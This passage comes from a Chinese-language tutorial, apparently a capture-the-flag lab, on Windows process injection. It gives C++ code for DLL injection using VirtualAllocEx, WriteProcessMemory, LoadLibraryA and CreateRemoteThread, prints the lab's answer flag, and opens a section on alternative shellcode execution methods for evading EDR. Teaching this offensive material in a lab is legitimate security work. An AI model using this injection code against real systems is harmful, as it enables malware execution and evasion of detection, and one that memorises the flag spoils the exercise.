d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第三步中，必须为恶意 DLL 分配内存。与大多数注入程序一样，可以使用 <code>VirtualAllocEx</code> 来完成此操作。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">LPVOID dllAllocatedMemory </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAllocEx</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	hProcess</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 目标进程句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">strlen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dllLibFullPath</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// DLL 路径的大小</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	MEM_RESERVE </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> MEM_COMMIT</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 保留和提交内存页</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	PAGE_EXECUTE_READWRITE </span><span class="token comment" style="color:#999988;font-style:italic">// 启用执行、读、写访问权限</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第四步中，我们需要将恶意 DLL 写入分配的内存位置。可以使用 <code>WriteProcessMemory</code> 来写入分配的内存区域。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">WriteProcessMemory</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	hProcess</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 目标进程句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	dllAllocatedMemory</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 分配的内存区域</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	dllLibFullPath</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 恶意 DLL 的路径</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">strlen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dllLibFullPath</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 恶意 DLL 的字节大小</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第五步，恶意 DLL 被写入内存后，我们只需要加载并执行它。为了加载 DLL，我们需要使用 <code>LoadLibrary</code>；它是从 <code>kernel32.dll</code> 导入的。加载后，可以使用 <code>CreateRemoteThread</code> 来执行内存，使用 <code>LoadLibrary</code> 作为起始函数。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">LPVOID loadLibrary </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LPVOID</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">GetProcAddress</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">GetModuleHandle</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;kernel32.dll&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 包含该调用的模块句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token string" style="color:#e3116c">&quot;LoadLibraryA&quot;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 导入的 API 调用</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HANDLE remoteThreadHandler </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateRemoteThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	hProcess</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 目标进程句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 从可执行文件中获取的默认堆栈大小</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LPTHREAD_START_ROUTINE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> loadLibrary</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 指向起始函数的指针</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	dllAllocatedMemory</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 指向分配的内存区域的指针</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 创建后立即运行</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我们可以将这些步骤组合起来，创建一个 DLL 注入程序。使用提供的 C++ 注入器并尝试进行 DLL 注入。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>确定一个作为 THM-Attacker 运行的进程的 PID 和名称。将进程名称和在 Injectors 目录中找到的恶意 DLL 作为参数，执行位于桌面 Injectors 目录中的 <code>dll-injector.exe</code>。</p><p>注入 DLL 后获得的标志是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{n07_4_m4l1c10u5_dll}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="memory-execution-alternatives---内存执行替代方案">Memory Execution Alternatives - 内存执行替代方案<a href="#memory-execution-alternatives---内存执行替代方案" class="hash-link" aria-label="Direct link to Memory Execution Alternatives - 内存执行替代方案" title="Direct link to Memory Execution Alternatives - 内存执行替代方案">​</a></h2>
<p>根据所处环境的不同，你可能需要调整 shellcode 的执行方式。例如，当 API 调用被挂钩（hook）且无法规避或解除挂钩，或者当 EDR（端点检测与响应）正在监控线程时，你需要改变执行策略。</p>
<p>到目前为止，我们主要研究了在本地或远程进程中分配和写入数据的方法。然而，执行同样是任何注入技术中的关键步骤，尽管在减少内存痕迹和 IOC（入侵指 Indicators of Compromise，入侵指标）时，它的优先级可能不如前两者高。与内存分配和写入不同，执行方式有许多选择。</p>
<p>在此之前，我们主要通过 <code>CreateThread</code> 及其对应的 <code>CreateRemoteThread</code> 来执行 shellcode。</p>
<p>在本任务中，我们将介绍另外三种可用于不同环境的执行方法。</p>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="调用函数指针invoking-function-pointers"><strong>调用函数指针（Invoking Function Pointers）</strong><a href="#调用函数指针invoking-function-pointers" class="hash-link" aria-label="Direct link to 调用函数指针invoking-function-pointers" title="Direct link to 调用函数指针invoking-function-pointers">​</a></h3>
<p>空类型（void）函数指针是一种较为新颖的内存执行方法，它完全依赖类型转换（typecasting）。</p>
<p>此技术仅适用于本地分配的内存，但不依赖于任何 API 调用或系统功能。</p>
<p>最常见的形式如下：</p>
<p><img decoding="async" loading="lazy" alt="image-20250311103545565" src="data:image/png;base64,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" width="339" height="55" class="img_ev3q"></p>
